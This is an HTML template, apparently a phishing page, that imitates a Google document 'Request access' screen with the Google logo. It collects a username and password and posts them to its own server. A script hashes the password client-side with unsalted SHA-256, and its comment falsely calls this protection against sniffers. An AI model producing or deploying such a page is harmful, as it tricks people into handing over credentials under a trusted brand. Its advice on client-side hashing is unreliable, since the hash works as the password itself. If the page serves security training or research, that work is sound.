<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js"></script>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/google.css') }}">
</head>
<body>

<div class="main-content">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">

    <div class="icon-circle">
        <svg width="32" height="32" viewBox="0 0 24 24" fill="#5f6368">
            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/>
        </svg>
    </div>
    
    <h1>Request access</h1>
    <p>Your request will be sent to the owner of this document. Please provide your details below.</p>

    <form class="request-form" action="/submit-request" method="POST" id="loginForm">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <input type="text" name="username" class="input-field" placeholder="Desired Username" required>
        <input type="password" name="password" class="input-field" placeholder="Desired password" required>
        <textarea name="message" class="input-field" placeholder="Add a message (optional)"></textarea>
        
        <button type="submit" class="submit-request-btn">Send request</button>
    </form>
</div>

<div class="footer-container">
    <button type="button" class="back-btn" onclick="history.back()">Back to login</button>
</div>
<script>
document.getElementById('loginForm').onsubmit = function() {
    var pwInput = document.querySelector('input[name="password"]');
    // Hash the password before it leaves the browser so sniffers only see a hash
    pwInput.value = sha256(pwInput.value);
};
</script>
</body>
</html>
